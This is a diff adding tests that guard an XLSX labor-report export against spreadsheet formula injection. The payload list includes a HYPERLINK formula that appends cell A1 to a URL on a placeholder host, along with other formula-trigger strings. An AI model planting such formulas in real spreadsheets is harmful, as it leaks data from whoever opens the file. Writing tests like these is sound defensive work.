@@ -6,6 +6,7 @@ Fixtures hand-construct LaborSummaryResponse / LaborEntryDetail without DB acces
 
 from __future__ import annotations
 
+from dataclasses import replace
 from datetime import date, datetime
 from io import BytesIO
 from uuid import uuid4
@@ -383,3 +384,60 @@ def test_money_cells_are_rounded_half_up_to_the_cent():
     assert _money(830.3049999999999) == 830.31
     assert _money(62.625) == 62.63
     assert _money(Decimal("62.625")) == 62.63
+
+
+_HOSTILE = [
+    "=1+1",
+    '=HYPERLINK("https://x/?"&A1,"c")',
+    "+1",
+    "-2+3",
+    "@SUM(A1)",
+    "\t=1",
+    "\r=1",
+    "  =1+1",
+]
+
+
+def _formula_cells(wb) -> list[str]:
+    return [f"{ws.title}!{c.coordinate}" for ws in wb for row in ws.iter_rows() for c in row if c.data_type == "f"]
+
+
+@pytest.mark.parametrize("hostile", _HOSTILE)
+def test_hostile_worker_name_and_note_never_become_formulas(hostile):
+    worker = _make_worker_summary(worker_id="w1", worker_name=hostile)
+    entry = _make_entry(worker_id="w1", worker_name=hostile, note=hostile)
+    bucket = MonthBucket(month=date(2026, 4, 1), summary=_make_summary_response(worker), daily_entries=[entry])
+    ctx = replace(
+        _make_context(from_month=date(2026, 4, 1), to_month=date(2026, 4, 30)),
+        project_name=hostile,
+        generated_by_email=hostile,
+    )
+    wb = __import__("openpyxl").load_workbook(BytesIO(build_xlsx(ctx, [bucket])))
+    assert _formula_cells(wb) == []
+    texts = [c for ws in wb for row in ws.iter_rows() for c in row if c.value == hostile.replace("\r", "\n")]
+    assert texts and all(c.data_type == "s" and c.quotePrefix for c in texts)
+
+
+@pytest.mark.parametrize("hostile", _HOSTILE)
+def test_hostile_single_worker_export_never_has_formulas(hostile):
+    worker = _make_worker_summary(worker_id="w1", worker_name=hostile)
+    entry = _make_entry(worker_id="w1", worker_name=hostile, note=hostile)
+    bucket = MonthBucket(month=date(2026, 4, 1), summary=_make_summary_response(worker), daily_entries=[entry])
+    ctx = replace(_make_context(from_month=date(2026, 4, 1), to_month=date(2026, 4, 30)), worker_name=hostile)
+    raw = build_xlsx(ctx, [bucket])
+    wb = __import__("openpyxl").load_workbook(BytesIO(raw))
+    assert _formula_cells(wb) == []
+    assert not wb.sheetnames[0].startswith(("=", "+", "-", "@", "\t", "\r", " "))
+    assert b"<f>" not in __import__("zipfile").ZipFile(BytesIO(raw)).read("xl/worksheets/sheet1.xml")
+
+
+def test_safe_cell_leaves_numbers_dates_and_plain_text_alone():
+    ctx, buckets = _make_two_month_buckets()
+    buckets[0].daily_entries[0].note = "rain delay"
+    wb = __import__("openpyxl").load_workbook(BytesIO(build_xlsx(ctx, buckets)))
+    ws = wb[wb.sheetnames[1]]
+    types = {c.data_type for row in ws.iter_rows() for c in row if c.value is not None}
+    assert {"n", "d", "s"} <= types
+    note = next(c for row in ws.iter_rows() for c in row if c.value == "rain delay")
+    assert note.data_type == "s" and not note.quotePrefix
+    assert any(c.is_date for row in ws.iter_rows() for c in row)
